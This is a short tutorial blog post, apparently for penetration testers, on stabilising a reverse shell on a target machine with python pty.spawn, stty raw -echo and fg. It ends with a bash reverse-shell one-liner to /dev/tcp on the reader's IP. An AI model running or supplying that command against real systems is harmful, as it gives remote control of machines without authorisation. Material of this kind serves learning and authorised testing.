---
layout: single
title:  "Upgrading your reverse shell"
author_profile: true
toc: true
toc_label: "Table of Contents"
toc_icon: "fas fa-book-open"
toc_sticky: true
---

> After we have gotten our reverse shell, it will have limitations such as no auto-completions and messy file listings. Here is how we can make our shell better inside our target's system:

Upgrading and stabilizing your shell enables you to type in your commands better. There are several ways to upgrade your shell once you are in a target machine.

## First way

Assuming you are running bash, in your reverse shell:

```
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Press on your keyboard: `Ctrl + Z`
Press on your keyboard: `Enter`

On your local host:

```
stty raw -echo
fg
```
Press on your keyboard: `Enter` (twice)

In the reverse shell:
```
export TERM=xterm
```

## Second way
Check the version of python the target system is running in using:
`which python` or `which python3`

Next,

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  //Upgrade to tty
Ctrl + Z                                        //Background the process
stty raw -echo
fg + Enter
```

Subsequently, turn your unstable shell into a stable one via:
```
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```
\
\
Thank you for reading!